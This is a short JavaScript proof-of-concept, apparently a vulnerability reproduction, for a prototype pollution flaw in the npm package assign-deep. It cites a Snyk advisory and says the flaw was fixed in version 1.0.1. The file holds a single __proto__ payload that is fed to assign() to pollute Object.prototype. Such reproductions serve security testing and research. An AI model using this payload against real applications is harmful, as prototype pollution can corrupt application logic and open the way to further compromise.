// https://snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211
// PP has been fixed in 1.0.1 https://npmjs.com/advisories/1014
const assign = require('assign-deep');

const payloads = [
  '{"__proto__": {"polluted": "yes"}}',
];
    
assign({}, JSON.parse(payloads[0]));
